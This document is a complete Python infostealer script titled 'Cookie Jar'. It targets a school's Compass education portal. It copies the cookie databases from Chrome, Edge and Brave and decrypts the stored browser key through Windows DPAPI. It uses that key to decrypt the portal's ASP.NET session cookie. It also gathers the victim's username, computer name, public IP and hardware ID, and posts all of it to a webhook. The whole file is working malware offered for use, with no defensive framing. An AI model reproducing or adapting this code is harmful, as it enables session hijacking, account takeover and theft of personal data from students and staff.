# _________                __   .__            ____.             
# \_   ___ \  ____   ____ |  | _|__| ____     |    |____ _______ 
# /    \  \/ /  _ \ /  _ \|  |/ /  |/ __ \    |    \__  \\_  __ \
# \     \___(  <_> |  <_> )    <|  \  ___//\__|    |/ __ \|  | \/
#  \________/\____/ \____/|__|_ \__|\_____>________(______/__|   
      

hostKey = '.mullauna-vic.compass.education'
cookiePrefix = "ASP.NET_SessionId="
webhookUrl = 'http://webhook.site'

# pip install pycryptodomex pywin32 discord
import os
from re import findall
from uuid import getnode
from json import loads, dumps
from base64 import b64decode
from sqlite3 import connect
from requests import post, get
from time import localtime, strftime
from shutil import copyfile
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from discord import Embed


def main():
	global webhook, embed

	# Browser appdata paths
	paths = [
	os.getenv("APPDATA") + "/../Local/BraveSoftware/Brave-Browser/",
	os.getenv("APPDATA") + "/../Local/Microsoft/Edge/",
	os.getenv("APPDATA") + "/../Local/Google/Chrome/",
	]

	embed = Embed(title="Cookie Jar", color=15535980)

	# Search Paths for cookies
	for path in paths: 
		if os.path.exists(path):
			try:
				getCookie(path)
				os.remove(os.getenv("APPDATA") + '/../Local/Temp/Cookies')
			except:
				continue
		else:
			continue
	
	# Get SysInfo
	getInfo()

	# Generate Embed
	embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
	embed.set_footer(text="Cookied Jar | Logger for Compass")
	embed.set_thumbnail(url="")
	post(webhookUrl,json=embed.to_dict())
	# print(dumps(embed.to_dict(), indent=4))
	


def getCookie(path):

	# Copy Cookies to tmp folder
	dbpath = os.getenv("APPDATA") + '/../Local/Temp/Cookies'
	if "Chrome" in path:
		copyfile(path+"User Data/Default/Cookies", dbpath)
	else:
		copyfile(path+"User Data/Default/Network/Cookies", dbpath)

	# Load encryption key
	encrypted_key = None
	with open(path+"User Data/Local State", 'r') as file:
		encrypted_key = loads(file.read())['os_crypt']['encrypted_key']
	encrypted_key = b64decode(encrypted_key)
	encrypted_key = encrypted_key[5:]
	decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

	# Connect to the Database
	conn = connect(dbpath)
	cursor = conn.cursor()

	# Decode encrypted_value
	cursor.execute(f"SELECT encrypted_value FROM cookies WHERE host_key='{hostKey}'") 
	encrypted_value = cursor.fetchall()[0][0]
	cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
	decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:]) 

	# Remove db
	conn.commit()
	conn.close()

	Cookie = str(decrypted_value.decode("utf-8"))
	embed.add_field(name="Found Cookie", value=f"```\nCookie: {cookiePrefix}{Cookie}\n```", inline=False)


def getInfo():
	# Get username, pc name, IP, HWID
	pcUsername = os.getlogin()
	pcName = os.getenv("COMPUTERNAME")
	pcIP = get('https://api.ipify.org/').text
	pcHWID = ':'.join(findall('..', '%012x' % getnode()))

	embed.add_field(name="SysInfo", value=f"```\nIP: {pcIP}\nHWID: {pcHWID}\n\nPC Username: {pcUsername}\nPC Name: {pcName}\n```", inline=False)

main()
# input(f"\n\nPress ENTER to close...") 
